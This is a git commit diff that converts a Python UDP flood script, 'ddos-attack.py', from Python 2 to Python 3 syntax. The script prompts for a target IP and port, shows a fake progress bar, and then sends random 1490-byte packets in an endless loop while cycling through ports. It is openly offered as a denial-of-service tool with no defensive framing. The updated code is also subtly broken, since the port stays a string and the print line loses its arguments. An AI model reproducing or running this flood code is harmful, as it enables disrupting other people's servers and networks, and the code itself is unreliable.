bff959a086d7644a9e347b7214cd2b9c169f3df9
opensourcedev9696 <73014160+opensourcedev9696@users.noreply.github.com>
2021-01-16 20:09:43 +0530

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -17,31 +17,30 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-clear
+
 os.system("figlet DDos Attack")
-print "Author   : opensourcedeveloper"
-print "github   : https://github.com/opensourcedev9696/"
-ip = raw_input("IP Target : ")
+print ("Author:opensourcedeveloper")
+print ("github:https://github.com/opensourcedev9696/")
+ip = input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("Sent %s packet to %s throught port:%s")
      if port == 65534:
        port = 1
-
